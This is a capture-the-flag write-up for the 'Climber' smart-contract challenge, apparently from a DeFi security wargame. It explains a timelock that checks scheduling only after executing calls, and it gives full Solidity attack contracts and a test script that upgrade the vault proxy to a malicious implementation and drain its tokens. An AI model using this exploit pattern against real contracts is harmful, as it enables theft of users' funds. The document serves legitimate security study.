# 12 - Climber

```solidity

// ClimberVault.sol
function sweepFunds(address tokenAddress) external onlySweeper {
    IERC20 token = IERC20(tokenAddress);
    require(token.transfer(_sweeper, token.balanceOf(address(this))), "Transfer failed");
}
```

We want to drain the fund by calling `sweepFunds` function.

To bypass `onlySweeper` modifer, we will upgrade the implementation contract address to our **`MaliciousVault`** contract.



```solidity
// ClimberVault.sol
function initialize(
    address admin,
    address proposer,
    address sweeper
) external initializer {
    // Initialize inheritance chain
    __Ownable_init();
    __UUPSUpgradeable_init();

    // Deploy timelock and transfer ownership to it
    transferOwnership(address(new ClimberTimelock(admin, proposer)));

    _setSweeper(sweeper);
    _setLastWithdrawal(block.timestamp);
    _lastWithdrawalTimestamp = block.timestamp;
}
```

The initial `owner` right after the deployment is an instance of **`ClimberTimelock`** contract.



```solidity
// ClimberTimelock.sol
function execute(
    address[] calldata targets,
    uint256[] calldata values,
    bytes[] calldata dataElements,
    bytes32 salt
) external payable {
    require(targets.length > 0, "Must provide at least one target");
    require(targets.length == values.length);
    require(targets.length == dataElements.length);

    bytes32 id = getOperationId(targets, values, dataElements, salt);

    for (uint8 i = 0; i < targets.length; i++) {
        targets[i].functionCallWithValue(dataElements[i], values[i]);
    }

    require(getOperationState(id) == OperationState.ReadyForExecution);
    operations[id].executed = true;
}
```

From **`ClimberTimelock`** we can make external calls by calling `execute` function.

But because execute function does not keep **C-E-I pattern** properly, \
(because it checks if the executing operation is schedule after the execution)\
we can first do whatever we want and schedule our operations right before it gets to the last `require` statement.

```solidity
// AccessControl.sol
function grantRole(bytes32 role, address account) public virtual override onlyRole(getRoleAdmin(role)) {
    _grantRole(role, account);
}
```

To schedule our operations, we will grant `PROPOSER_ROLE` to our attacker acount.



```solidity
// ClimberTimelock.sol
constructor(address admin, address proposer) {
    _setRoleAdmin(ADMIN_ROLE, ADMIN_ROLE);
    _setRoleAdmin(PROPOSER_ROLE, ADMIN_ROLE);

    // deployer + self administration
    _setupRole(ADMIN_ROLE, admin);
    _setupRole(ADMIN_ROLE, address(this));

    _setupRole(PROPOSER_ROLE, proposer);
}
```

We can do this simply by calling `grantRole` function, since the contract itself has `ADMIN_ROLE`.



```solidity
function updateDelay(uint64 newDelay) external {
    require(msg.sender == address(this), "Caller must be timelock itself");
    require(newDelay <= 14 days, "Delay must be 14 days or less");
    delay = newDelay;
}
```

And to execute multiple operations, we will first update the delay to `0`.



```solidity
// ClimberVault.sol
function upgradeTo(address newImplementation) external virtual onlyProxy {
    _authorizeUpgrade(newImplementation);
    _upgradeToAndCallUUPS(newImplementation, new bytes(0), false);
}
```

Finally, we will upgrade the implementation contract to our malicious contract that implements `sweepFunds` function without any restriction.



1. **`ClimberTimelock`** \
   \-> make the delay `0` so we can execute multiple operations
2. **`ClimberTimelock`**\
   \-> grant `PROPOSER_ROLE` to our `attacker` account\
   (so we can&#x20;
3. **`ClimberVault`**\
   \-> upgrade Implementation address to our **`MaliciousVault`** contract
4. **`ClimberTimelock`**\
   \-> schedule these operations so we can pass the last `require` condition in `execute`
5. **`ClimberVault`**\
   **``**-> delegatecall `sweepFunds` function in **`MaliciousVault`**\
   **``**(Now all the tokens are moved to **`AttackClimber`** from **`ClimberVault`**)
6. **`AttackClimber`**\
   \-> move all funds to `attacker` account\


## Solution

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "./ClimberTimelock.sol";
import "./ClimberVault.sol";

contract AttackClimber {
    ClimberVault vault;
    ClimberTimelock timelock;
    MaliciousVault newVault;
    IERC20 token;
    address[] targets;
    uint256[] values;
    bytes[] dataElements;
    bytes32 salt = 0x0;

    constructor(
        ClimberVault _vault,
        ClimberTimelock _timelock,
        MaliciousVault _newVault,
        IERC20 _token
    ) {
        vault = _vault;
        timelock = _timelock;
        newVault = _newVault;
        token = _token;
    }

    function attack() external {
        /*============ calldata ============*/
        // 1) update delay to 0
        targets.push(address(timelock));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("updateDelay(uint64)", 0));

        // 2) give attacker PROPSER_ROLE
        targets.push(address(timelock));
        values.push(0);
        dataElements.push(
            abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("PROPOSER_ROLE"), address(this))
        );

        // 3) upgrade ClimberVault Implemenation to AttackClimber contract
        targets.push(address(vault));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("upgradeTo(address)", address(newVault)));

        // 4) schedule these function calls

        // targets.push(address(timelock));
        // values.push(0);
        // @dev this causes recursive issue
        // dataElements.push(abi.encodeWithSignatrue("schedule(address[],uint256[],bytes[])", targets, values, dataElements));

        targets.push(address(this));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("schedule()"));

        /*============ execute ============*/
        timelock.execute(targets, values, dataElements, salt);

        /*============ drain the DVT balance from ClimberVault ============*/

        vault.sweepFunds(address(token));
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }

    function schedule() external {
        timelock.schedule(targets, values, dataElements, salt);
    }
}

contract MaliciousVault is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    // Same storage layout as "ClimberVault"
    uint256 public constant WITHDRAWAL_LIMIT = 1 ether;
    uint256 public constant WAITING_PERIOD = 15 days;

    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    constructor() {}

    function sweepFunds(address tokenAddress) external {
        IERC20 token = IERC20(tokenAddress);
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }

    // need to override virtual function
    function _authorizeUpgrade(address newImplementation) internal override onlyOwner {}
}
```

```javascript
it('Exploit', async function () {
  /** CODE YOUR EXPLOIT HERE */
  const MaliciousVaultFactory = await (await ethers.getContractFactory('MaliciousVault')).connect(attacker);
  const newVault = await MaliciousVaultFactory.deploy();
  await newVault.deployed();

  const AttackClimberFactory = await (await ethers.getContractFactory('AttackClimber')).connect(attacker);
  const attackClimber = await AttackClimberFactory.deploy(
    this.vault.address,
    this.timelock.address,
    newVault.address,
    this.token.address
  );
  await attackClimber.deployed();

  await (await attackClimber.attack()).wait();
});
```

Done! 😎
